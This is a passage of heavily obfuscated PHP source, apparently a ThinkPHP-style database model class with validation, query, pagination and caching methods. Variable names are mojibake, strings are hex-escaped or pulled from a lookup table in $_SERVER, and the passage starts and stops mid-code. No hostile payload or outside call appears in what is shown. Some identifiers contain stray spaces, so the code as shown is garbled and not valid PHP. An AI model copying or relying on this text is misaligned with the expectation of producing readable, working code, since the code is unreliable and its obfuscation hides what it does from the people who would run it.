(isset($—Çîè°ò[$´Ù‰çÅ¸[0]])) { array_unshift($â¬™Òê, $—Çîè°ò[$´Ù‰çÅ¸[0]]); } if ($İá³Ë¶Å[374] == $´Ù‰çÅ¸[3]) { $—Çîè°ò[$´Ù‰çÅ¸[0]] = call_user_func_array($´Ù‰çÅ¸[1], $â¬™Òê); } else { $—Çîè°ò[$´Ù‰çÅ¸[0]] = call_user_func_array(array(&$this, $´Ù‰çÅ¸[1]), $â¬™Òê); } break; case $İá³Ë¶Å[326]: $—Çîè°ò[$´Ù‰çÅ¸[0]] = $—Çîè°ò[$´Ù‰çÅ¸[1]]; break; case $İá³Ë¶Å[376]: if ($İá³Ë¶Å[12] === $—Çîè°ò[$´Ù‰çÅ¸[0]]) { unset($—Çîè°ò[$´Ù‰çÅ¸[0]]); } break; case $İá³Ë¶Å[377]: default: $—Çîè°ò[$´Ù‰çÅ¸[0]] = $´Ù‰çÅ¸[1]; } if (!1 === $—Çîè°ò[$´Ù‰çÅ¸[0]]) { unset($—Çîè°ò[$´Ù‰çÅ¸[0]]); } } } } return $—Çîè°ò; } protected function autoValidation($íËÅÎö, $ŠÕÔˆí±) { $¡‚ŒĞş´ =& $_SERVER[Ö†ØøÖ±]; if (!empty($this->options[$¡‚ŒĞş´[378]])) { $ÄÖÖü§â = $this->options[$¡‚ŒĞş´[378]]; unset($this->options[$¡‚ŒĞş´[378]]); } elseif (!empty($this->_validate)) { $ÄÖÖü§â = $this->_validate; } if (isset($ÄÖÖü§â)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÄÖÖü§â as $ÑÒÎ÷¸ï => $üåŸ°…Û) { if (empty($üåŸ°…Û[5]) || $üåŸ°…Û[5] == THINK_MODEL_BOTH || $üåŸ°…Û[5] == $ŠÕÔˆí±) { if (0 == strpos($üåŸ°…Û[2], $¡‚ŒĞş´[379]) && strpos($üåŸ°…Û[2], $¡‚ŒĞş´[380])) { $üåŸ°…Û[2] = think_lang(substr($üåŸ°…Û[2], 2, -1)); } $üåŸ°…Û[3] = isset($üåŸ°…Û[3]) ? $üåŸ°…Û[3] : THINK_EXISTS_VALIDATE; $üåŸ°…Û[4] = isset($üåŸ°…Û[4]) ? $üåŸ°…Û[4] : $¡‚ŒĞş´[381]; switch ($üåŸ°…Û[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($íËÅÎö, $üåŸ°…Û)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¡‚ŒĞş´[12] != trim($íËÅÎö[$üåŸ°…Û[0]])) { if (!1 === $this->_validationField($íËÅÎö, $üåŸ°…Û)) { return !1; } } break; default: if (isset($íËÅÎö[$üåŸ°…Û[0]])) { if (!1 === $this->_validationField($íËÅÎö, $üåŸ°…Û)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Îøë›ä, $šú»èÉİ) { if (!1 === $this->_validationFieldItem($Îøë›ä, $šú»èÉİ)) { if ($this->patchValidate) { $this->error[$šú»èÉİ[0]] = $šú»èÉİ[2]; } else { $this->error = $šú»èÉİ[2]; return !1; } } return; } protected function _validationFieldItem($ñÎ»°², $ÑªŠñË) { $ƒÄš“èƒ =& $_SERVER[Ö†ØøÖ±]; switch (strtolower(trim($ÑªŠñË[4]))) { case $ƒÄš“èƒ[374]: case $ƒÄš“èƒ[375]: $şÒ²¼šŠ = isset($ÑªŠñË[6]) ? (array) $ÑªŠñË[6] : array(); if (is_string($ÑªŠñË[0]) && strpos($ÑªŠñË[0], $ƒÄš“èƒ[50])) { $ÑªŠñË[0] = explode($ƒÄš“èƒ[50], $ÑªŠñË[0]); } if (is_array($ÑªŠñË[0])) { foreach ($ÑªŠñË[0] as $ ñÕÏª) { $À°ü´Ô[$ ñÕÏª] = $ñÎ»°²[$ ñÕÏª]; } array_unshift($şÒ²¼šŠ, $À°ü´Ô); } else { array_unshift($şÒ²¼šŠ, $ñÎ»°²[$ÑªŠñË[0]]); } if ($ƒÄš“èƒ[374] == $ÑªŠñË[4]) { return call_user_func_array($ÑªŠñË[1], $şÒ²¼šŠ); } else { return call_user_func_array(array(&$this, $ÑªŠñË[1]), $şÒ²¼šŠ); } case $ƒÄš“èƒ[382]: return $ñÎ»°²[$ÑªŠñË[0]] == $ñÎ»°²[$ÑªŠñË[1]]; case $ƒÄš“èƒ[383]: if (is_string($ÑªŠñË[0]) && strpos($ÑªŠñË[0], $ƒÄš“èƒ[50])) { $ÑªŠñË[0] = explode($ƒÄš“èƒ[50], $ÑªŠñË[0]); } $áÅì‰ó = array(); if (is_array($ÑªŠñË[0])) { foreach ($ÑªŠñË[0] as $ ñÕÏª) { $áÅì‰ó[$ ñÕÏª] = $ñÎ»°²[$ ñÕÏª]; } } else { $áÅì‰ó[$ÑªŠñË[0]] = $ñÎ»°²[$ÑªŠñË[0]]; } if (!empty($ñÎ»°²[$this->getPk()])) { $áÅì‰ó[$this->getPk()] = array($ƒÄš“èƒ[384], $ñÎ»°²[$this->getPk()]); } if ($this->where($áÅì‰ó)->find()) { return !1; } return !0; default: return $this->check($ñÎ»°²[$ÑªŠñË[0]], $ÑªŠñË[1], $ÑªŠñË[4]); } } public function check($ÂÏ¾Ô­Ä, $Ê½»øóß, $ÃÂ€Ô¹ = "\x72\x65\147\145\x78") { $ÛÆ·Ìç» =& $_SERVER[Ö†ØøÖ±]; $ÃÂ€Ô¹ = strtolower(trim($ÃÂ€Ô¹)); switch ($ÃÂ€Ô¹) { case $ÛÆ·Ìç»[7]: case $ÛÆ·Ìç»[385]: $ü–“¶ñ = is_array($Ê½»øóß) ? $Ê½»øóß : explode($ÛÆ·Ìç»[50], $Ê½»øóß); return $ÃÂ€Ô¹ == $ÛÆ·Ìç»[7] ? in_array($ÂÏ¾Ô­Ä, $ü–“¶ñ) : !in_array($ÂÏ¾Ô­Ä, $ü–“¶ñ); case $ÛÆ·Ìç»[386]: case $ÛÆ·Ìç»[387]: if (is_array($Ê½»øóß)) { $¼ÅÁ¤˜ = $Ê½»øóß[0]; $ÇÌÙĞ½ = $Ê½»øóß[1]; } else { list($¼ÅÁ¤˜, $ÇÌÙĞ½) = explode($ÛÆ·Ìç»[50], $Ê½»øóß); } return $ÃÂ€Ô¹ == $ÛÆ·Ìç»[386] ? $ÂÏ¾Ô­Ä >= $¼ÅÁ¤˜ && $ÂÏ¾Ô­Ä <= $ÇÌÙĞ½ : $ÂÏ¾Ô­Ä < $¼ÅÁ¤˜ || $ÂÏ¾Ô­Ä > $ÇÌÙĞ½; case $ÛÆ·Ìç»[388]: case $ÛÆ·Ìç»[389]: return $ÃÂ€Ô¹ == $ÛÆ·Ìç»[388] ? $ÂÏ¾Ô­Ä == $Ê½»øóß : $ÂÏ¾Ô­Ä != $Ê½»øóß; case $ÛÆ·Ìç»[390]: $åçòŒ† = mb_strlen($ÂÏ¾Ô­Ä, $ÛÆ·Ìç»[391]); if (strpos($Ê½»øóß, $ÛÆ·Ìç»[50])) { list($¼ÅÁ¤˜, $ÇÌÙĞ½) = explode($ÛÆ·Ìç»[50], $Ê½»øóß); return $åçòŒ† >= $¼ÅÁ¤˜ && $åçòŒ† <= $ÇÌÙĞ½; } else { return $åçòŒ† == $Ê½»øóß; } case $ÛÆ·Ìç»[392]: list($ò°àÔ×, $è´öŠ¸Ó) = explode($ÛÆ·Ìç»[50], $Ê½»øóß); if (!is_numeric($ò°àÔ×)) { $ò°àÔ× = strtotime($ò°àÔ×); } if (!is_numeric($è´öŠ¸Ó)) { $è´öŠ¸Ó = strtotime($è´öŠ¸Ó); } return NOW_TIME >= $ò°àÔ× && NOW_TIME <= $è´öŠ¸Ó; case $ÛÆ·Ìç»[393]: return in_array(get_client_ip(), explode($ÛÆ·Ìç»[50], $Ê½»øóß)); case $ÛÆ·Ìç»[394]: return !in_array(get_client_ip(), explode($ÛÆ·Ìç»[50], $Ê½»øóß)); case $ÛÆ·Ìç»[381]: default: return $this->regex($ÂÏ¾Ô­Ä, $Ê½»øóß); } } public function query($·¯û¥³Ê, $¹ÂÏåƒã = false) { $Í•“ö… =& $_SERVER[Ö†ØøÖ±]; if (!is_bool($¹ÂÏåƒã) && !is_array($¹ÂÏåƒã)) { $¹ÂÏåƒã = func_get_args(); array_shift($¹ÂÏåƒã); } $·¯û¥³Ê = str_replace(array($Í•“ö…[246], $Í•“ö…[395]), $Í•“ö…[53], $·¯û¥³Ê); $·¯û¥³Ê = $this->parseSql($·¯û¥³Ê, $¹ÂÏåƒã); return $this->db->query($·¯û¥³Ê); } public function execute($âÉı©Å, $ãÛë›Ñú = false) { if (!is_bool($ãÛë›Ñú) && !is_array($ãÛë›Ñú)) { $ãÛë›Ñú = func_get_args(); array_shift($ãÛë›Ñú); } $âÉı©Å = $this->parseSql($âÉı©Å, $ãÛë›Ñú); return $this->db->execute($âÉı©Å); } protected function parseSql($Û‰ØÊ, $©øªÇÅì) { $·ŠÂÔô¿ =& $_SERVER[Ö†ØøÖ±]; if (!0 === $©øªÇÅì) { $®…É‹¬ = $this->_parseOptions(); $Û‰ØÊ = $this->db->parseSql($Û‰ØÊ, $®…É‹¬); } elseif (is_array($©øªÇÅì)) { $©øªÇÅì = array_map(array($this->db, $·ŠÂÔô¿[396]), $©øªÇÅì); $Û‰ØÊ = vsprintf($Û‰ØÊ, $©øªÇÅì); } else { $Û‰ØÊ = strtr($Û‰ØÊ, array($·ŠÂÔô¿[397] => $this->getTableName(), $·ŠÂÔô¿[398] => think_config($·ŠÂÔô¿[297]))); } $this->db->setModel($this->name); return $Û‰ØÊ; } public function db($ÛÑøÔãÁ = '', $ÛœŞÕÅ = '', $ë‰›‹Ñœ = array()) { $§…¦¬‰ò =& $_SERVER[Ö†ØøÖ±]; if ($§…¦¬‰ò[12] === $ÛÑøÔãÁ && $this->db) { return $this->db; } static $ôÑ¦¯ÓË = array(); static $„é×ÁÖ = array(); if (!isset($„é×ÁÖ[$ÛÑøÔãÁ]) || isset($„é×ÁÖ[$ÛÑøÔãÁ]) && $ÛœŞÕÅ && $ôÑ¦¯ÓË[$ÛÑøÔãÁ] != $ÛœŞÕÅ) { if (!empty($ÛœŞÕÅ) && is_string($ÛœŞÕÅ) && !1 === strpos($ÛœŞÕÅ, $§…¦¬‰ò[8])) { $ÛœŞÕÅ = think_config($ÛœŞÕÅ); } $ÛÑøÔãÁ = think_guid($ÛœŞÕÅ); $„é×ÁÖ[$ÛÑøÔãÁ] = Db::getInstance($ÛœŞÕÅ); } elseif (NULL === $ÛœŞÕÅ) { $„é×ÁÖ[$ÛÑøÔãÁ]->close(); unset($„é×ÁÖ[$ÛÑøÔãÁ]); return; } if (!empty($ë‰›‹Ñœ)) { if (is_string($ë‰›‹Ñœ)) { parse_str($ë‰›‹Ñœ, $ë‰›‹Ñœ); } foreach ($ë‰›‹Ñœ as $µ´›Ì» => $¤ÏÁŠ½¬) { $this->setProperty($µ´›Ì», $¤ÏÁŠ½¬); } } $ôÑ¦¯ÓË[$ÛÑøÔãÁ] = $ÛœŞÕÅ; $this->db = $„é×ÁÖ[$ÛÑøÔãÁ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $©¿üÑ•ä = get_class($this); if ($©¿üÑ•ä == $_SERVER[Ö†ØøÖ±][399]) { return $this->name; } $this->name = substr($©¿üÑ•ä, 0, -5); } return $this->name; } public function getTableName() { $±“ŒÃÓ† =& $_SERVER[Ö†ØøÖ±]; if (empty($this->trueTableName)) { $ç•ëš¦Š = !empty($this->tablePrefix) ? $this->tablePrefix : $±“ŒÃÓ†[12]; if (!empty($this->tableName)) { $ç•ëš¦Š .= $this->tableName; } else { $ç•ëš¦Š .= think_parse_name($this->name); } $this->trueTableName = strtolower($ç•ëš¦Š); } return (!empty($this->dbName) ? $this->dbName . $±“ŒÃÓ†[10] : $±“ŒÃÓ†[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $†ìàªÉÔ =& $_SERVER[Ö†ØøÖ±]; return isset($this->fields[$†ìàªÉÔ[304]]) ? $this->fields[$†ìàªÉÔ[304]] : $this->pk; } public function getDbFields() { $æñ…®ï =& $_SERVER[Ö†ØøÖ±]; if (isset($this->options[$æñ…®ï[332]])) { $„„·è—ı = $this->db->getFields($this->options[$æñ…®ï[332]]); return $„„·è—ı ? array_keys($„„·è—ı) : !1; } if ($this->fields) { $„„·è—ı = $this->fields; unset($„„·è—ı[$æñ…®ï[303]], $„„·è—ı[$æñ…®ï[304]], $„„·è—ı[$æñ…®ï[305]], $„„·è—ı[$æñ…®ï[302]]); return $„„·è—ı; } return !1; } public function data($ ­™Æô = '') { $”ŞìÓ‚ =& $_SERVER[Ö†ØøÖ±]; if ($”ŞìÓ‚[12] === $ ­™Æô && !empty($this->data)) { return $this->data; } if (is_object($ ­™Æô)) { $ ­™Æô = get_object_vars($ ­™Æô); } elseif (is_string($ ­™Æô)) { parse_str($ ­™Æô, $ ­™Æô); } elseif (!is_array($ ­™Æô)) { think_exception(think_lang($”ŞìÓ‚[324])); } $this->data = $ ­™Æô; return $this; } public function join($Üë¥½Ò–) { $§ûî’ë =& $_SERVER[Ö†ØøÖ±]; if (is_array($Üë¥½Ò–)) { $this->options[$§ûî’ë[335]] = $Üë¥½Ò–; } elseif (!empty($Üë¥½Ò–)) { $this->options[$§ûî’ë[335]][] = $Üë¥½Ò–; } return $this; } public function union($åßõ²ø•, $ç¯Ó»‹Œ = false) { $±¢Ö‚àß =& $_SERVER[Ö†ØøÖ±]; if (empty($åßõ²ø•)) { return $this; } if ($ç¯Ó»‹Œ) { $this->options[$±¢Ö‚àß[400]][$±¢Ö‚àß[401]] = !0; } if (is_object($åßõ²ø•)) { $åßõ²ø• = get_object_vars($åßõ²ø•); } if (is_string($åßõ²ø•)) { $ùÇÊğİŸ = $åßõ²ø•; } elseif (is_array($åßõ²ø•)) { if (isset($åßõ²ø•[0])) { $this->options[$±¢Ö‚àß[400]] = array_merge($this->options[$±¢Ö‚àß[400]], $åßõ²ø•); return $this; } else { $ùÇÊğİŸ = $åßõ²ø•; } } else { think_exception(think_lang($±¢Ö‚àß[324])); } $this->options[$±¢Ö‚àß[400]][] = $ùÇÊğİŸ; return $this; } public function cache($ÏÛ²·‰® = true, $½§ÔÔèÃ = null, $‡ª²è™ä = '') { $çş¨ì =& $_SERVER[Ö†ØøÖ±]; if (!1 !== $ÏÛ²·‰®) { $this->options[$çş¨ì[402]] = array($çş¨ì[94] => $ÏÛ²·‰®, $çş¨ì[392] => $½§ÔÔèÃ, $çş¨ì[33] => $‡ª²è™ä); } return $this; } public function field($‘°ÔÒ—˜, $ÂÂ  £ = false) { $ÄÎÑ› =& $_SERVER[Ö†ØøÖ±]; if (!0 === $‘°ÔÒ—˜) { $‘ŠåÃæ = $this->getDbFields(); $‘°ÔÒ—˜ = $‘ŠåÃæ ? $‘ŠåÃæ : $ÄÎÑ›[203]; } elseif ($ÂÂ  £) { if (is_string($‘°ÔÒ—˜)) { $‘°ÔÒ—˜ = explode($ÄÎÑ›[50], $‘°ÔÒ—˜); } $‘ŠåÃæ = $this->getDbFields(); $‘°ÔÒ—˜ = $‘ŠåÃæ ? array_diff($‘ŠåÃæ, $‘°ÔÒ—˜) : $‘°ÔÒ—˜; } $this->options[$ÄÎÑ›[326]] = $‘°ÔÒ—˜; return $this; } public function scope($ ¤öÃ = '', $¦…µÓæ = NULL) { $Ç¥ÅáäÁ =& $_SERVER[Ö†ØøÖ±]; if ($Ç¥ÅáäÁ[12] === $ ¤öÃ) { if (isset($this->_scope[$Ç¥ÅáäÁ[37]])) { $Ö½„°úâ = $this->_scope[$Ç¥ÅáäÁ[37]]; } else { return $this; } } elseif (is_string($ ¤öÃ)) { $çÚÊ ²à = explode($Ç¥ÅáäÁ[50], $ ¤öÃ); $Ö½„°úâ = array(); foreach ($çÚÊ ²à as $†¬˜Àœç) { if (!isset($this->_scope[$†¬˜Àœç])) { continue; } $Ö½„°úâ = array_merge($Ö½„°úâ, $this->_scope[$†¬˜Àœç]); } if (!empty($¦…µÓæ) && is_array($¦…µÓæ)) { $Ö½„°úâ = array_merge($Ö½„°úâ, $¦…µÓæ); } } elseif (is_array($ ¤öÃ)) { $Ö½„°úâ = $ ¤öÃ; } if (is_array($Ö½„°úâ) && !empty($Ö½„°úâ)) { $this->options = array_merge($this->options, array_change_key_case($Ö½„°úâ)); } return $this; } public function where($õß©ÔÊ›, $ƒ™¾ˆÛõ = null) { $ù–‘â½£ =& $_SERVER[Ö†ØøÖ±]; if (!is_null($ƒ™¾ˆÛõ) && is_string($õß©ÔÊ›)) { if (!is_array($ƒ™¾ˆÛõ)) { $ƒ™¾ˆÛõ = func_get_args(); array_shift($ƒ™¾ˆÛõ); } $ƒ™¾ˆÛõ = array_map(array($this->db, $ù–‘â½£[396]), $ƒ™¾ˆÛõ); $õß©ÔÊ› = vsprintf($õß©ÔÊ›, $ƒ™¾ˆÛõ); } elseif (is_object($õß©ÔÊ›)) { $õß©ÔÊ› = get_object_vars($õß©ÔÊ›); } elseif (is_array($õß©ÔÊ›)) { foreach ($õß©ÔÊ› as $ËõÜºÈÁ => $¡“µ÷¹í) { if ((is_numeric($ËõÜºÈÁ) || !$ËõÜºÈÁ) && is_string($¡“µ÷¹í)) { if (strpos($¡“µ÷¹í, $ù–‘â½£[403]) === 0) { continue; } think_trace($ù–‘â½£[404], $ù–‘â½£[12], $ù–‘â½£[49]); die; } } } if (is_string($õß©ÔÊ›) && $ù–‘â½£[12] != $õß©ÔÊ›) { $„š±Æğ¤ = array(); $„š±Æğ¤[$ù–‘â½£[405]] = $õß©ÔÊ›; $õß©ÔÊ› = $„š±Æğ¤; } if (isset($this->options[$ù–‘â½£[328]])) { $this->options[$ù–‘â½£[328]] = array_merge($this->options[$ù–‘â½£[328]], $õß©ÔÊ›); } else { $this->options[$ù–‘â½£[328]] = $õß©ÔÊ›; } return $this; } public function limit($î¹Ö¡ı¢, $£íÉ’ˆ = null) { $òõİ¹Šâ =& $_SERVER[Ö†ØøÖ±]; $this->options[$òõİ¹Šâ[345]] = is_null($£íÉ’ˆ) ? $î¹Ö¡ı¢ : $î¹Ö¡ı¢ . $òõİ¹Šâ[50] . $£íÉ’ˆ; return $this; } public function page($…À½¯ù‡, $ã¤‘ÉÌÃ = null) { $é›–°´Á =& $_SERVER[Ö†ØøÖ±]; $this->options[$é›–°´Á[406]] = is_null($ã¤‘ÉÌÃ) ? $…À½¯ù‡ : $…À½¯ù‡ . $é›–°´Á[50] . $ã¤‘ÉÌÃ; return $this; } public function comment($¦¹Éãª†) { $this->options[$_SERVER[Ö†ØøÖ±][407]] = $¦¹Éãª†; return $this; } public function setProperty($ã‡ÍŒ¶‘, $¿Õ ĞÚÑ) { if (property_exists($this, $ã‡ÍŒ¶‘)) { $this->{$ã‡ÍŒ¶‘} = $¿Õ ĞÚÑ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\x69\155\145", "\164\151\155\x65", "\151\156\163\x65\162\164\x2c\x75\160\144\x61\x74\x65", "\x66\165\156\x63\x74\151\157\156"), array("\x63\162\x65\x61\164\145\x54\151\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\163\145\162\164", "\x66\165\x6e\143\164\x69\x6f\156")); public function setDataAuto($¥ìï‹§µ) { $this->dataAuto = $¥ìï‹§µ; } public function __construct($ÁóÏÒµ‚ = '', $éëßÈ÷Ğ = '', $›ìäó¢È = '') { parent::__construct($ÁóÏÒµ‚, $éëßÈ÷Ğ, $›ìäó¢È); } protected $tableMeta = array(); protected function _beforeInsert(&$Ÿ¦‹™óÚ, $òª™ŸÃ”) { $²Ø°ôˆô =& $_SERVER[Ö†ØøÖ±]; if (!$this->checkDataAutoHas($²Ø°ôˆô[408])) { return; } $this->dataBeforeFilter($Ÿ¦‹™óÚ, $²Ø°ôˆô[408]); } protected function _beforeUpdate(&$ü—¦š¹å, $­«áÁ³Ç) { $¥½¬Í²ƒ =& $_SERVER[Ö†ØøÖ±]; if (!$this->checkDataAutoHas($¥½¬Í²ƒ[409])) { return; } $this->dataBeforeFilter($ü—¦š¹å, $¥½¬Í²ƒ[409]); } protected function _afterSelect(&$ëòâ¤ûı, $ãì®´ìÆ) { if (!is_array($ëòâ¤ûı)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö†ØøÖ±][410])) { return; } foreach ($ëòâ¤ûı as &$Ø¥ˆèºİ) { $this->dataAfterFilter($Ø¥ˆèºİ); } unset($Ø¥ˆèºİ); } protected function _afterFind(&$·Ãó¢è, $ßÄ«È) { if (!is_array($·Ãó¢è)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö†ØøÖ±][410])) { return; } $this->dataAfterFilter($·Ãó¢è); } public static function textEncode($ç¨™ïÉÕ) { if (!$ç¨™ïÉÕ) { return $ç¨™ïÉÕ; } $¨åˆÎˆú = json_encode($ç¨™ïÉÕ); $¨åˆÎˆú = preg_replace_callback($_SERVER[Ö†ØøÖ±][411], function ($š°˜÷¨) { return addslashes($š°˜÷¨[0]); }, $¨åˆÎˆú); return json_decode($¨åˆÎˆú); } public static function textDecode($á¬ûÊÓ¢) { $ÓÉéĞ°ù =& $_SERVER[Ö†ØøÖ±]; $·Ô§ô„â = json_encode($á¬ûÊÓ¢); $·Ô§ô„â = preg_replace_callback($ÓÉéĞ°ù[412], function ($Ûğí…¶×) { return $_SERVER[Ö†ØøÖ±][97]; }, $·Ô§ô„â); return json_decode($·Ô§ô„â); } public function setAutoIncrement($„É‚Ğì„) { $á­âÄã­ = array($this->getPk() => $„É‚Ğì„); $§İƒ•ìü = $this->data($á­âÄã­)->add(); if ($§İƒ•ìü) { $this->delete($§İƒ•ìü); } } public function getAutoIncrement() { $Öç¥“É» = $this->getTableName(); $¯´ ³ö = $this->max($this->getPk()); $î£™Ë¦­ = $this->query("\x73\150\157\167\x20\164\x61\142\x6c\x65\x20\x73\164\141\x74\x75\x73\40\167\150\145\x72\145\x20\x4e\x61\155\x65\x3d\47{$Öç¥“É»}\x27"); $¯ıŸ¦­¢ = $î£™Ë¦­[0][$_SERVER[Ö†ØøÖ±][413]]; $µ‚šØÖ¥ = max($¯´ ³ö, $¯ıŸ¦­¢); return $µ‚šØÖ¥; } protected function _callBefore($È¯•é², $Êø±ô†Ç) { return $this->cacheCallCheck($È¯•é², $Êø±ô†Ç, !1); } protected function _callAfter($Îèã—Ó…, $†ÂÄ¨¦) { return $this->cacheCallCheck($Îèã—Ó…, $†ÂÄ¨¦, !0); } protected function cacheFunctionAlias($ŒššŒ¿ë) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($•„¡„²½, $¡˜¾ñïè, $¢ë®²” = false) { $´°øîŞ¨ = $this->cacheFunctionAlias($¡˜¾ñïè); if (!$´°øîŞ¨) { return; } foreach ($´°øîŞ¨ as $´İ¨Æˆ° => $œØØŸÂ·) { $“—üõÙ˜ = $œØØŸÂ·[0]; $¿Íğ—‰Œ = explode($_SERVER[Ö†ØøÖ±][50], $œØØŸÂ·[1]); if ($•„¡„²½ == $´İ¨Æˆ°) { return $this->cacheFunctionGet($´İ¨Æˆ°, $“—üõÙ˜); } if ($¢ë®²” && in_array($•„¡„²½, $¿Íğ—‰Œ)) { $this->cacheFunctionClear($´İ¨Æˆ°, $“—üõÙ˜); } } } public function cacheFunctionGet($¡‰Ÿ¨“, $…ë÷–Ô) { $ç¬Š® = $this->cacheKeyMake($¡‰Ÿ¨“, $…ë÷–Ô); $ŸæŠ§ÀÅ = Cache::get($ç¬Š®); if (!is_array($ŸæŠ§ÀÅ)) { $ŸæŠ§ÀÅ = call_user_func_array(array($this, $¡‰Ÿ¨“), array($…ë÷–Ô, !0)); Cache::set($ç¬Š®, $ŸæŠ§ÀÅ); } return $ŸæŠ§ÀÅ; } public function cacheFunctionClear($±œøæƒå, $†Ûœ¿®Ø) { $©í¿åÇ¬ = $†Ûœ¿®Ø; if (!is_array($†Ûœ¿®Ø)) { $©í¿åÇ¬ = array($†Ûœ¿®Ø); } foreach ($©í¿åÇ¬ as $åõ—“Ëä) { $ôğ×­ü´ = $this->cacheKeyMake($±œøæƒå, $åõ—“Ëä); Cache::remove($ôğ×­ü´); } } private function cacheKeyMake($ççÒ—¦, $Ú§çé¾) { $Ÿ§Æ‡ =& $_SERVER[Ö†ØøÖ±]; return get_class($this) . $Ÿ§Æ‡[11] . $ççÒ—¦ . $Ÿ§Æ‡[414] . $Ú§çé¾; } protected function selectPageReset() { $ÁüÌë =& $_SERVER[Ö†ØøÖ±]; if (isset($GLOBALS[$ÁüÌë[415]])) { return; } $GLOBALS[$ÁüÌë[415]] = isset($GLOBALS[$ÁüÌë[7]][$ÁüÌë[416]]) ? $GLOBALS[$ÁüÌë[7]][$ÁüÌë[416]] : !1; $GLOBALS[$ÁüÌë[417]] = isset($GLOBALS[$ÁüÌë[7]][$ÁüÌë[406]]) ? $GLOBALS[$ÁüÌë[7]][$ÁüÌë[406]] : !1; $GLOBALS[$ÁüÌë[7]][$ÁüÌë[416]] = !1; $GLOBALS[$ÁüÌë[7]][$ÁüÌë[406]] = !1; } protected function selectPageRestore() { $÷³õö·Ù =& $_SERVER[Ö†ØøÖ±]; if (!isset($GLOBALS[$÷³õö·Ù[415]])) { return; } $GLOBALS[$÷³õö·Ù[7]][$÷³õö·Ù[416]] = $GLOBALS[$÷³õö·Ù[415]]; $GLOBALS[$÷³õö·Ù[7]][$÷³õö·Ù[406]] = $GLOBALS[$÷³õö·Ù[417]]; if ($GLOBALS[$÷³õö·Ù[7]][$÷³õö·Ù[416]] === !1) { unset($GLOBALS[$÷³õö·Ù[7]][$÷³õö·Ù[416]]); } if ($GLOBALS[$÷³õö·Ù[7]][$÷³õö·Ù[406]] === !1) { unset($GLOBALS[$÷³õö·Ù[7]][$÷³õö·Ù[406]]); } unset($GLOBALS[$÷³õö·Ù[415]]); unset($GLOBALS[$÷³õö·Ù[417]]); } protected function selectPage($Ğ˜ÄİìŸ = 200, $í­ÒäŞŠ = 1) { $å“ÆÎ±ó =& $_SERVER[Ö†ØøÖ±]; global $in; $Ö½…²©Ğ = $this->optionsValue(); $´‡°óîş = 50000; $Ğ˜ÄİìŸ = isset($in[$å“ÆÎ±ó[416]]) && $in[$å“ÆÎ±ó[416]] ? $in[$å“ÆÎ±ó[416]] : $Ğ˜ÄİìŸ; if ($Ğ˜ÄİìŸ === -1) { $in[$å“ÆÎ±ó[416]] = !1; $´‡°óîş = 100000000; $Ğ˜ÄİìŸ = $´‡°óîş; } $¥¡ôÓ…› = $Ö½…²©Ğ; $¥¡ôÓ…›[$å“ÆÎ±ó[418]] = array(); $Ğ˜ÄİìŸ = intval($Ğ˜ÄİìŸ); $Ğ˜ÄİìŸ = $Ğ˜ÄİìŸ <= 5 ? 5 : ($Ğ˜ÄİìŸ >= $´‡°óîş ? $´‡°óîş : $Ğ˜ÄİìŸ); $í­ÒäŞŠ = intval(isset($in[$å“ÆÎ±ó[406]]) && $in[$å“ÆÎ±ó[406]] ? $in[$å“ÆÎ±ó[406]] : $í­ÒäŞŠ); $í­ÒäŞŠ = $í­ÒäŞŠ <= 1 ? 1 : $í­ÒäŞŠ; $™ÀÕğÈ = array(); $£²Ê“ô = 1; if ($í­ÒäŞŠ == 1 && $£²Ê“ô) { $this->optionsValue($Ö½…²©Ğ); $™ÀÕğÈ = $this->page($í­ÒäŞŠ, $Ğ˜ÄİìŸ)->select(); $§ãÕ¡‡­ = is_array($™ÀÕğÈ) ? count($™ÀÕğÈ) : 0; if ($§ãÕ¡‡­ < $Ğ˜ÄİìŸ) { $—ò¾‹á¢ = 1; } else { $this->optionsValue($¥¡ôÓ…›); $§ãÕ¡‡­ = intval($this->count()); $—ò¾‹á¢ = ceil($§ãÕ¡‡­ / $Ğ˜ÄİìŸ); } } else { $this->optionsValue($¥¡ôÓ…›); $§ãÕ¡‡­ = intval($this->count()); $—ò¾‹á¢ = ceil($§ãÕ¡‡­ / $Ğ˜ÄİìŸ); $í­ÒäŞŠ = $í­ÒäŞŠ >= $—ò¾‹á¢ ? $—ò¾‹á¢ : $í­ÒäŞŠ; $this->optionsValue($Ö½…²©Ğ); $™ÀÕğÈ = $this->page($í­ÒäŞŠ, $Ğ˜ÄİìŸ)->select(); } if (!is_array($™ÀÕğÈ)) { $™ÀÕğÈ = array(); } if ($—ò¾‹á¢ == 1) { $§ãÕ¡‡­ = count($™ÀÕğÈ); } $ìªèÈ¶Ş = array($å“ÆÎ±ó[419] => array($å“ÆÎ±ó[420] => $§ãÕ¡‡­, $å“ÆÎ±ó[416] => $Ğ˜ÄİìŸ, $å“ÆÎ±ó[406] => $í­ÒäŞŠ, $å“ÆÎ±ó[421] => $—ò¾‹á¢), $å“ÆÎ±ó[422] => $™ÀÕğÈ); return $ìªèÈ¶Ş; } protected function checkLength($ôãØÒş½, $Ë¤é¹â‚ = 0, $ĞÏôÎæŠ = '') { $­§©ßüã =& $_SERVER[Ö†ØøÖ±]; $Ë¤é¹â‚ = $Ë¤é¹â‚ ? $Ë¤é¹â‚ : 65536; if (!$ôãØÒş½ || strlen($ôãØÒş½) < $Ë¤é¹â‚) { return; } $ĞÏôÎæŠ = $ĞÏôÎæŠ ? $ĞÏôÎæŠ . $­§©ßüã[71] : $­§©ßüã[12]; 